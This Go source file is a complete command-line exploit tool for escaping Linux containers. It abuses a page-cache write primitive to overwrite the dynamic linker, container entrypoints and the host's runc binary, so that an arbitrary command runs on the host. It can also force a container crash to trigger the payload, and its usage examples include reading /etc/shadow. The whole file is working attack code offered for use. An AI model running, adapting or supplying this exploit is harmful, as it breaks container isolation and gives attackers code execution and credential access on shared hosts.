//go:build linux

package main

import (
	"bytes"
	"context"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"page-cache-container-escape/copyfail"
)

//go:embed injector-amd64.bin
var injectorBin []byte

const (
	payloadMarker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01"
	selfShebang   = "#!/proc/self/exe\n"
)

var linkerPaths = []string{
	"/lib64/ld-linux-x86-64.so.2",
	"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
}

// --- Copy Fail primitive ---

func pageCacheWrite(path string, offset int64, content []byte) error {
	return copyfail.Write(path, offset, content, copyfail.Write4)
}

// --- Patch injector with payload ---

func patchInjector(payload []byte) ([]byte, error) {
	if len(payload) == 0 || len(payload) > 4096 {
		return nil, fmt.Errorf("payload length %d out of range", len(payload))
	}
	marker := []byte(payloadMarker)
	offset := bytes.Index(injectorBin, marker)
	if offset < 0 {
		return nil, fmt.Errorf("payload marker not found in injector binary")
	}
	lenOff := offset + len(marker)
	bufOff := lenOff + 8

	patched := bytes.Clone(injectorBin)
	for i := range 8 {
		patched[lenOff+i] = byte(uint64(len(payload)) >> (8 * i))
	}
	copy(patched[bufOff:], make([]byte, 4096))
	copy(patched[bufOff:], payload)
	return patched, nil
}

// --- Write injector to ld.so ---

func writeInjector(payload []byte) error {
	injector, err := patchInjector(payload)
	if err != nil {
		return err
	}
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err != nil {
			continue
		}
		if int64(len(injector)) > info.Size() {
			return fmt.Errorf("injector (%d) exceeds %s size (%d)", len(injector), target, info.Size())
		}
		fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
		if err := pageCacheWrite(target, 0, injector); err != nil {
			return err
		}
		return nil
	}
	return fmt.Errorf("no dynamic linker found")
}

// --- Write shebang to target file ---

func writeShebang(path string) error {
	fmt.Printf("    [*] Target: %s -> %q\n", path, selfShebang)
	return pageCacheWrite(path, 0, []byte(selfShebang))
}

func resolveEntrypoint(pid int) string {
	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	argv := bytes.Split(bytes.TrimRight(cmdline, "\x00"), []byte{0})
	if len(argv) > 0 && len(argv[0]) > 0 && filepath.IsAbs(string(argv[0])) {
		if resolved, err := filepath.EvalSymlinks(string(argv[0])); err == nil {
			return resolved
		}
	}
	return "/bin/sh"
}

// --- Crash container ---

func crashContainer(ctx context.Context, pid int) {
	// Method 1: cgroup.kill (cgroup v2)
	cgPath, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
	for _, line := range bytes.Split(cgPath, []byte("\n")) {
		if bytes.HasPrefix(line, []byte("0::")) {
			rel := string(bytes.TrimPrefix(line, []byte("0::")))
			killFile := filepath.Join("/sys/fs/cgroup", rel, "cgroup.kill")
			if os.WriteFile(killFile, []byte("1"), 0644) == nil {
				return
			}
		}
	}
	// Method 2: kill all processes then exit
	for i := 0; i < 10; i++ {
		syscall.Kill(-1, syscall.SIGKILL)
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(137)
}

// --- Process monitor: scan /proc for target process ---

func isTargetProcess(pid int) bool {
	exe, _ := os.Readlink(fmt.Sprintf("/proc/%d/exe", pid))
	base := filepath.Base(exe)
	if base == "runc" || base == "docker-runc" {
		return true
	}
	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	cmd := string(cmdline)
	// runc init process inside container PID ns
	if strings.Contains(cmd, "runc") && strings.Contains(cmd, "init") {
		return true
	}
	if cmd == "/proc/self/exe\x00init\x00" {
		return true
	}
	argv0 := string(bytes.SplitN(cmdline, []byte{0}, 2)[0])
	if filepath.Base(argv0) == "runc" || filepath.Base(argv0) == "docker-runc" {
		return true
	}
	return false
}

func captureTargetFD(timeout time.Duration) (int, error) {
	var deadline time.Time
	if timeout > 0 {
		deadline = time.Now().Add(timeout)
	}
	maxPID := currentMaxPID()

	for {
		if !deadline.IsZero() && time.Now().After(deadline) {
			return -1, fmt.Errorf("timeout waiting for target process")
		}
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return -1, err
		}
		for _, e := range entries {
			pid, err := strconv.Atoi(e.Name())
			if err != nil || pid <= maxPID {
				continue
			}
			maxPID = pid
			if !isTargetProcess(pid) {
				continue
			}
			// Found target, try to open its exe (may need retry)
			path := fmt.Sprintf("/proc/%d/exe", pid)
			for retry := 0; retry < 50; retry++ {
				f, err := os.Open(path)
				if err == nil {
					fmt.Printf("    [+] Captured: pid=%d fd=%d\n", pid, int(f.Fd()))
					return int(f.Fd()), nil
				}
				time.Sleep(time.Millisecond)
			}
		}
		time.Sleep(2 * time.Millisecond)
	}
}

func currentMaxPID() int {
	entries, _ := os.ReadDir("/proc")
	max := 0
	for _, e := range entries {
		if pid, err := strconv.Atoi(e.Name()); err == nil && pid > max {
			max = pid
		}
	}
	return max
}

// --- Exploit: exec mode ---
// Overwrites /bin/sh with shebang, then waits for someone to `kubectl exec`
// into the container. When runc appears, captures its fd and overwrites it.

func exploitExec(cmd string, target string, timeout time.Duration) error {
	payload := []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))

	fmt.Println("")
	fmt.Println("[*] Page Cache Container Escape (exec mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] Target: %s\n\n", target)

	// Step 1: overwrite target with shebang
	fmt.Println("[*] Step 1: Overwriting exec target with shebang...")
	resolved := target
	if r, err := filepath.EvalSymlinks(target); err == nil {
		resolved = r
	}
	if err := writeShebang(resolved); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done\n")

	// Step 2: wait for target process to appear, capture fd, overwrite
	fmt.Println("[*] Step 2: Waiting for target process (trigger with: kubectl exec <pod> -- <cmd>)...")
	fd, err := captureTargetFD(timeout)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Printf("[*] Step 3: Overwriting target binary via %s...\n", fdPath)
	if err := pageCacheWrite(fdPath, 0, payload); err != nil {
		return err
	}
	fmt.Println("[+] Done. Next invocation will execute payload on host.")
	return nil
}

// --- Exploit: restart mode ---
// Overwrites ld.so + entrypoint, then crashes container.
// On restart, injector captures fd and overwrites target from inside the loading chain.

func exploitRestart(cmd string, pid int, timeout time.Duration) error {
	payload := []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))

	fmt.Println("")
	fmt.Println("[*] Page Cache Container Escape (restart mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] PID: %d\n\n", pid)

	fmt.Println("[*] Step 1: Overwriting dynamic linker...")
	if err := writeInjector(payload); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done\n")

	fmt.Println("[*] Step 2: Overwriting container entrypoint...")
	entrypoint := resolveEntrypoint(pid)
	if err := writeShebang(entrypoint); err != nil {
		return err
	}
	fmt.Println("[+] Step 2: Done\n")

	fmt.Println("[*] Step 3: Triggering container crash...")
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	crashContainer(ctx, pid)
	fmt.Println("[+] Step 3: Done")
	return nil
}

// --- CLI ---

func usage() {
	fmt.Fprintf(os.Stderr, `Usage: pcce <mode> --cmd <command> [options]

Modes:
  exec      Overwrite exec target, wait for kubectl exec to capture target process
  restart   Overwrite ld.so + entrypoint, crash container, auto-exploit on restart

Options:
  --cmd, -c <command>    Command to execute on host (required)
  --target, -t <path>    Exec target to overwrite (exec mode, default: /bin/sh)
  --pid <pid>            Target PID (restart mode, default: 1)
  --no-restore           Don't auto-restore after payload execution
  --timeout <duration>   Timeout (default: 30s, 0=forever for exec mode)

Examples:
  pcce exec --cmd 'touch /tmp/pwned'
  pcce exec --cmd 'cat /etc/shadow' --target /usr/bin/python3
  pcce restart --cmd 'touch /tmp/pwned'
`)
}

func main() {
	var (
		cmd       string
		mode      string
		target    = "/bin/sh"
		pid       = 1
		noRestore = false
		timeout   = 30 * time.Second
	)

	args := os.Args[1:]
	if len(args) > 0 && !strings.HasPrefix(args[0], "-") {
		mode = args[0]
		args = args[1:]
	}

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--cmd", "-c":
			i++
			if i < len(args) {
				cmd = args[i]
			}
		case "--target", "-t":
			i++
			if i < len(args) {
				target = args[i]
			}
		case "--no-restore":
			noRestore = true
		case "--pid":
			i++
			if i < len(args) {
				fmt.Sscanf(args[i], "%d", &pid)
			}
		case "--timeout":
			i++
			if i < len(args) {
				if d, err := time.ParseDuration(args[i]); err == nil {
					timeout = d
				}
			}
		case "--help", "-h":
			usage()
			os.Exit(0)
		}
	}

	if cmd == "" {
		fmt.Fprintln(os.Stderr, "error: --cmd is required")
		usage()
		os.Exit(2)
	}
	if mode == "" {
		fmt.Fprintln(os.Stderr, "error: mode is required (exec or restart)")
		usage()
		os.Exit(2)
	}
	if !noRestore {
		cmd += "\necho 3 > /proc/sys/vm/drop_caches"
	}

	var err error
	switch mode {
	case "exec":
		if timeout == 30*time.Second {
			timeout = 0 // exec mode default: wait forever
		}
		err = exploitExec(cmd, target, timeout)
	case "restart":
		err = exploitRestart(cmd, pid, timeout)
	default:
		fmt.Fprintf(os.Stderr, "error: unknown mode %q (use exec or restart)\n", mode)
		os.Exit(2)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}
}
